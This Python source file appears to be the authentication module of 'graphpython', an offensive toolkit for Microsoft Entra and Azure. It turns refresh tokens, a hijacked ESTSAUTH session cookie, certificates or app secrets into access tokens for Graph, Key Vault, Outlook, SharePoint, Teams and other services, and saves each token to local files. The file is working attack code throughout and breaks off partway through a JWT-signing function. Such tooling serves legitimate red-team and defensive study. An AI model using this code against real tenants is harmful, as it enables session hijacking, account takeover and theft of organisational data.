import requests
import json
import jwt
import hashlib
import time 
import base64
import uuid 
import sys 
from datetime import datetime, timedelta, timezone
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.backends import default_backend
from urllib.parse import urlencode, urlparse, parse_qs
from graphpython.utils.helpers import print_yellow, print_green, print_red, get_user_agent, get_access_token

##################
# Authentication #
##################

# get-graphtokens
def get_graphtokens(args):
    print_yellow("[*] Get-GraphTokens")
    print("=" * 80)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    resource = "https://graph.microsoft.com"
    user_agent = get_user_agent(args) 
    
    body = {
        "client_id": client_id,
        "resource": resource
    }
    
    headers = {
        "User-Agent": user_agent
    }

    device_code_response = requests.post("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0", data=body, headers=headers)
    device_code_response_content = device_code_response.content.decode()
    device_code = None
    message = None
    
    try:
        device_code_json_response = json.loads(device_code_response_content)
        device_code = device_code_json_response["device_code"]
        message = device_code_json_response["message"]
    
    except Exception as ex:
        print_red(f"[-] Failed to parse device code response: {ex}")
        print("=" * 80)
        exit()
    
    print(f"{message}\n")
    time.sleep(3)
    
    start_time = datetime.now()
    polling_duration = timedelta(minutes=15)
    last_authorization_pending_time = datetime.min
    
    while datetime.now() - start_time < polling_duration:
        token_body = {
            "client_id": client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "code": device_code
        }
        
        token_response = requests.post("https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0", data=token_body)
        token_response_content = token_response.content.decode()
        
        if token_response.status_code == 400:
            if datetime.now() - last_authorization_pending_time >= timedelta(minutes=1):
                print("authorization_pending...")
                last_authorization_pending_time = datetime.now()
            time.sleep(3)
        elif not token_response.ok or "authorization_pending" in token_response_content:
            # continue polling
            time.sleep(3)
        else:
            token_json = json.loads(token_response_content)
            print_green("\n[+] Token Obtained!\n")
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")
            file_path = "graph_tokens.txt"
            with open(file_path, "a") as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")
            
            print_green(f"\n[+] Token information written to '{file_path}'.")
            exit()
    
    print_red("[-] Polling expired. Token not obtained.")
    print("=" * 80)

# get-tenantid
def get_tenantid(args):
    if not args.domain:
        print_red("[-] Error: --domain argument is required for Get-TenantID command")
        return
    
    print_yellow("[*] Get-TenantID")
    print("=" * 80)
    user_agent = get_user_agent(args) 
    headers = {
        "User-Agent": user_agent
    }
    
    try:
        response = requests.get(f"https://login.microsoftonline.com/{args.domain}/.well-known/openid-configuration", headers=headers)
        response.raise_for_status()
        response_content = response.content.decode()

        open_id_config = json.loads(response_content)
        tenant_id = open_id_config["authorization_endpoint"].split('/')[3]

        print(tenant_id)
    
    except requests.exceptions.RequestException as ex:
        print_red(f"[-] Error retrieving OpenID configuration: {ex}")
    print("=" * 80)


# get-tokenscope
def get_tokenscope(args):
    print_yellow("[*] Get-TokenScope")
    print("=" * 80)
    
    try:
        json_token = jwt.decode(get_access_token(args.token), options={"verify_signature": False})
        scope = json_token.get("scp")
        if scope:
            scope_array = scope.split(' ')
            for s in scope_array:
                print(s)
        else:
            print_red("[-] No scopes found in the access token")
    
    except jwt.DecodeError:
        print_red("[-] Invalid access token format")
    print("=" * 80)

# decode-accesstoken
def decode_accesstoken(args):
    print_yellow("[*] Decode-AccessToken")
    print("=" * 80)
    
    try:
        json_token = jwt.decode(get_access_token(args.token), options={"verify_signature": False})
        for key, value in json_token.items():
            print(f"{key}: {value}")
    
    except jwt.DecodeError:
        print_red("[-] Invalid access token format")
    
    print("=" * 80)

# invoke-refreshtomsgraphtoken
def invoke_refreshtomsgraphtoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToMSGraphToken command")
        return

    print_yellow("[*] Invoke-RefreshToMSGraphToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://graph.microsoft.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}"
    
    headers = {
        "User-Agent": user_agent
    }

    body = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "openid"
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        body["claims"] = claims

    response = requests.post(f"{auth_url}/oauth2/token?api-version=1.0", data=body, headers=headers)
    if response.status_code == 200:
        print_green("[+] Token Obtained!\n")
        token_response = response.json()
        for key, value in token_response.items():
            print(f"[*] {key}: {value}")
        file_path = "new_graph_tokens.txt"
        with open(file_path, "a") as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_response.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")

        print_green(f"\n[+] Token information written to '{file_path}'.")

    else:
        print_red(f"[-] Failed to get Microsoft Graph token: {response.status_code}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtoazuremanagementtoken
def invoke_refreshtoazuremanagementtoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToAzureManagementToken command")
        return

    print_yellow("[*] Invoke-RefreshToAzureManagementToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://management.azure.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}"
    headers = {
        "User-Agent": user_agent
    }

    body = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "openid"
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        body["claims"] = claims

    response = requests.post(f"{auth_url}/oauth2/token?api-version=1.0", data=body, headers=headers)
    if response.status_code == 200:
        print_green("[+] Token Obtained!\n")
        token_response = response.json()
        for key, value in token_response.items():
            print(f"[*] {key}: {value}")

        file_path = "az_tokens.txt"
        with open(file_path, "a") as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_response.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    else:
        print_red(f"[-] Failed to get Azure Management token: {response.status_code}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtovaulttoken
def invoke_refreshtovaulttoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToAzureManagementToken command")
        return

    print_yellow("[*] Invoke-RefreshToVaultToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    scope = "https://vault.azure.net/.default"
    auth_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "vault_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Azure Vault token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtomsteamstoken
def invoke_refreshtomsteamstoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToMSTeamsToken command")
        return

    print_yellow("[*] Invoke-RefreshToMSTeamsToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    refresh_token = get_access_token(args.token)
    resource = "https://api.spaces.skype.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"
    headers = {
        "User-Agent": user_agent
    }
    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }
    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims
    
    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")
        file_path = "teams_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get MS Teams token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtoofficeappstoken
def invoke_refreshtoofficeappstoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOfficeAppsToken command")
        return

    print_yellow("[*] Invoke-RefreshToOfficeAppsToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    refresh_token = get_access_token(args.token)
    resource = "https://officeapps.live.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "officeapps_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")

        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Office Apps token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtoofficemanagementtoken
def invoke_refreshtoofficemanagementtoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOfficeManagementToken command")
        return

    print_yellow("[*] Invoke-RefreshToOfficeManagementToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "00b41c95-dab0-4487-9791-b9d2c32c80f2"
    refresh_token = get_access_token(args.token)
    resource = "https://manage.office.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "officemanagement_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Office Management token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtooutlooktoken
def invoke_refreshtooutlooktoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOutlookToken command")
        return

    print_yellow("[*] Invoke-RefreshToOutlookToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://outlook.office365.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "outlook_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Outlook token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtosubstratetoken
def invoke_refreshtosubstratetoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToSubstrateToken command")
        return

    print_yellow("[*] Invoke-RefreshToSubstrateToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://substrate.office.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "substrate_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Substrate token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtoyammertoken
def invoke_refreshtoyammertoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToYammerToken command")
        return

    print_yellow("[*] Invoke-RefreshToYammerToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://www.yammer.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"
    
    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims
        
    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "yammer_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Yammer token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtointuneenrollmenttoken
def invoke_refreshtointuneenrollmenttoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToIntuneEnrollment command")
        return

    print_yellow("[*] Invoke-RefreshToIntuneEnrollment")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    refresh_token = get_access_token(args.token)
    resource = "https://enrollment.manage.microsoft.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "intune_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get Intune Enrollment token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtoonedrivetoken
def invoke_refreshtoonedrivetoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToOneDriveToken command")
        return

    print_yellow("[*] Invoke-RefreshToOneDriveToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    refresh_token = get_access_token(args.token)
    resource = "https://officeapps.live.com/"
    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    scope = "openid"

    headers = {
        "User-Agent": user_agent
    }
    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": scope
    }

    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("[+] Token Obtained!\n")
        
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")

        file_path = "onedrive_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")

    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get OneDrive token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-refreshtosharepointtoken
def invoke_refreshtosharepointtoken(args):
    if not args.tenant:
        print_red("[-] Error: --tenant argument is required for Invoke-RefreshToSharePointToken command")
        return
        
    print_yellow("[*] Invoke-RefreshToSharePointToken")
    print("=" * 80)
    user_agent = get_user_agent(args)
    client_id = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    refresh_token = get_access_token(args.token)
    
    try:
        sharepoint_tenant = input("\nEnter SharePoint Tenant Name: ").strip()
        use_admin = input("Use Admin Suffix '-admin' (yes/no): ").strip().lower() == 'yes'
        admin_suffix = '-admin' if use_admin else ''
        
    except KeyboardInterrupt:
        sys.exit()

    auth_url = f"https://login.microsoftonline.com/{args.tenant}/oauth2/token?api-version=1.0"
    resource = f"https://{sharepoint_tenant}{admin_suffix}.sharepoint.com"
    
    headers = {
        "User-Agent": user_agent
    }

    data = {
        "resource": resource,
        "client_id": client_id,
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "scope": "openid"
    }
    
    if args.use_cae:
        claims = json.dumps({
            "access_token": {
                "xms_cc": {
                    "values": ["cp1"]
                }
            }
        }, separators=(',', ':'))
        data["claims"] = claims

    try:
        response = requests.post(auth_url, data=data, headers=headers)
        response.raise_for_status()
        print_green("\n[+] Token Obtained!\n")
        
        token_json = response.json()
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")
        
        file_path = "sharepoint_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")
    
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get SharePoint token: {str(e)}")
        print_red(response.text)
    print("=" * 80)

# invoke-certtoaccesstoken
def invoke_certtoaccesstoken(args):
    if not args.tenant or not args.cert or not args.id:
        print_red("[-] Error: --tenant, --cert, and --id arguments are required for Invoke-CertToAccessToken command")
        return

    print_yellow("[*] Invoke-CertToAccessToken")
    print("=" * 80)
    tenant_id = args.tenant
    client_id = args.id
    cert_path = args.cert

    try:
        audience = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        with open(cert_path, 'rb') as cert_file:
            pfx_data = cert_file.read()

        private_key, certificate, *_ = pkcs12.load_key_and_certificates(pfx_data, None, default_backend())
        # calculate x5t (X.509 cert SHA-1 thumbprint)
        fingerprint = certificate.fingerprint(hashes.SHA1())
        x5t = base64.urlsafe_b64encode(fingerprint).rstrip(b'=').decode('ascii')

        payload = {
            'sub': client_id,
            'nbf': datetime.now(timezone.utc),
            'exp': datetime.now(timezone.utc) + timedelta(minutes=120),
            'iat': datetime.now(timezone.utc),
            'iss': client_id,
            'aud': audience
        }

        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        jwt_token = jwt.encode(payload, private_key_pem, algorithm='RS256', headers={'kid': fingerprint.hex().upper(), 'x5t': x5t})
        user_agent = get_user_agent(args)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': user_agent
        }
        
        data = {
            'grant_type': 'client_credentials',
            'client_id': client_id,
            'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
            'client_assertion': jwt_token,
            'scope': 'https://graph.microsoft.com/.default'
        }
        
        try:
            response = requests.post(f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token", headers=headers, data=data)
            response.raise_for_status()  
            print_green("[+] Token Obtained!\n")
            token_json = response.json()
            for key, value in token_json.items():
                print(f"[*] {key}: {value}")

            file_path = "cert_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")
            print_green(f"\n[+] Token information written to '{file_path}'.")
        
        except requests.exceptions.RequestException as e:
            print_red(f"[-] Failed to get certificate access token: {str(e)}")
            print_red(response.text)
    except Exception as e:
        print_red(f"[-] Error loading .pfx file: {str(e)}")
    print("=" * 80)

# invoke-estscookietoaccesstoken
def invoke_estscookietoaccesstoken(args):
    if not args.tenant or not args.estsauthcookie:
        print_red("[-] Error: --tenant and --estsauthcookie are required for Invoke-ESTSCookieToAccessToken command")
        return

    print_yellow("[*] Invoke-ESTSCookieToAccessToken")
    print("=" * 80)
    user_agent = get_user_agent(args)

    try:
        client = input("\nEnter Client (MSTeams, MSEdge, AzurePowerShell): ").strip()
        if client == "":
            client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
            print("Using Default Client: MSTeams")
        elif client == "MSTeams":
            client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
        elif client == "MSEdge":
            client_id = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
        elif client == "AzurePowerShell":
            client_id = "1950a258-227b-4e31-a9cf-717495945fc2"
        else:
            print_red(f"[-] Invalid client: {client}")
            print("=" * 80)
            sys.exit()

    except KeyboardInterrupt:
        sys.exit()

    print()
    resource = "https://graph.microsoft.com/"
    headers = {
        "User-Agent": user_agent
    }
    
    ests_auth_cookie = get_access_token(args.estsauthcookie)
    session = requests.Session()
    
    if ests_auth_cookie.startswith("ESTSAUTH="):
        session.cookies.set("ESTSAUTH", ests_auth_cookie.split("=", 1)[1], domain="login.microsoftonline.com")
    elif ests_auth_cookie.startswith("ESTSAUTHPERSISTENT="):
        session.cookies.set("ESTSAUTHPERSISTENT", ests_auth_cookie.split("=", 1)[1], domain="login.microsoftonline.com")
    else:
        print_red("[-] Invalid ESTS cookie format")
        print("=" * 80)
        sys.exit()

    state = str(uuid.uuid4())
    redirect_uri = "https://login.microsoftonline.com/common/oauth2/nativeclient"
    auth_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urlencode({'response_type': 'code', 'client_id': client_id, 'resource': resource, 'redirect_uri': redirect_uri, 'state': state})}"
    response = session.get(auth_url, headers=headers, allow_redirects=False)
    
    if response.status_code == 302:
        location = response.headers['Location']
        parsed_url = urlparse(location)
        query_params = parse_qs(parsed_url.query)
        
        if 'code' in query_params:
            refresh_token = query_params['code'][0]
        else:
            print_red("[-] Code not found in redirected URL path")
            print_red(f"    Requested URL: {auth_url}")
            print_red(f"    Response Code: {response.status_code}")
            print_red(f"    Response URI:  {location}")
            print("=" * 80)
            return None
    else:
        print_red("[-] Expected 302 redirect but received other status")
        print_red(f"[-] Requested URL: {auth_url}")
        print_red(f"[-] Response Code: {response.status_code}")
        print_red("[-] The request may require user interaction to complete, or the provided cookie is invalid")
        print("=" * 80)
        return None

    if refresh_token:
        token_url = "https://login.microsoftonline.com/common/oauth2/token"
        body = {
            "resource": resource,
            "client_id": client_id,
            "grant_type": "authorization_code",
            "redirect_uri": redirect_uri,
            "code": refresh_token,
            "scope": "openid"
        }

        if args.use_cae:
            claims = json.dumps({
                "access_token": {
                    "xms_cc": {
                        "values": ["cp1"]
                    }
                }
            }, separators=(',', ':'))
            body["claims"] = claims

        token_response = session.post(token_url, headers=headers, data=body)
        token_response_json = token_response.json()
        access_token = token_response_json.get('access_token')

        if access_token:
            print_green("[+] Token Obtained!\n")
            for key, value in token_response_json.items():
                print(f"[*] {key}: {value}")

            file_path = "estscookie_tokens.txt"
            with open(file_path, 'a') as writer:
                writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
                for key, value in token_response_json.items():
                    writer.write(f"[*] {key}: {value}\n")
                writer.write("\n")

            print_green(f"\n[+] Token information written to '{file_path}'.")
            print("=" * 80)
        else:
            print_red("[-] Failed to obtain access token.")
            print("=" * 80)
            return None
    else:
        print_red("[-] Refresh token is missing.")
        print("=" * 80)
        return None

# invoke-appsecrettoaccesstoken
def invoke_appsecrettoaccesstoken(args):
    if not args.tenant or not args.id or not args.secret:
        print_red("[-] Error: --tenant, --id, and --secret required for Invoke-AppSecretToAccessToken command")
        return
    
    print_yellow("[*] Invoke-AppSecretToAccessToken")
    print("=" * 80)
    
    tenant_id = args.tenant
    client_id = args.id
    client_secret = args.secret
    
    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    token_data = {
        'grant_type': 'client_credentials',
        'client_id': client_id,
        'client_secret': client_secret,
        'scope': 'https://graph.microsoft.com/.default' # can change e.g. 'https://management.azure.com/.default' for Az
    }

    # check cae for client_credential grants
    
    user_agent = get_user_agent(args)
    headers = {
        "User-Agent": user_agent
    }
    
    try:
        token_response = requests.post(token_url, data=token_data, headers=headers)
        token_response.raise_for_status()
        token_json = token_response.json()
        
        print_green("[+] Token Obtained!\n")
        for key, value in token_json.items():
            print(f"[*] {key}: {value}")
        
        file_path = "appsecret_tokens.txt"
        with open(file_path, 'a') as writer:
            writer.write(f"[+] Token Obtained! ({datetime.now()})\n")
            for key, value in token_json.items():
                writer.write(f"[*] {key}: {value}\n")
            writer.write("\n")
        print_green(f"\n[+] Token information written to '{file_path}'.")
    
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Failed to get app secret token: {str(e)}")
        if 'token_response' in locals():
            print_red(token_response.text)
    
    print("=" * 80)

# new-signedjwt
def new_signedjwt(args):
    if not args.tenant or not args.id:
        print_red("[-] Error: --tenant and --id required for New-SignedJWT command")
        return

    print_yellow("[*] New-SignedJWT")
    print("=" * 80)
    
    try:
        kvURI = input("\nEnter Key Vault Certificate Identifier URL: ").strip()
    except KeyboardInterrupt:
        sys.exit()

    keyName = kvURI.split('/certificates/', 1)[-1].split('/', 1)[0]
    # cert details
    kv_uri = f"{kvURI.split('/certificates/')[0]}/certificates?api-version=7.3"
    
    headers = {
        "Authorization": f"Bearer {get_access_token(args.token)}"
    }
    
    response = requests.get(kv_uri, headers=headers)
    response.raise_for_status()
    certs = response.json()
    cert_uri = next((c for c in certs['value'] if keyName in c['id']), None)
    
    if not cert_uri:
        raise Exception("Certificate not found.")
    
    cert_id = cert_uri['id']
    cert_uri_with_version = f"{cert_id}?api-version=7.3"
    response = requests.get(cert_uri_with_version, headers=headers)
    response.raise_for_status()
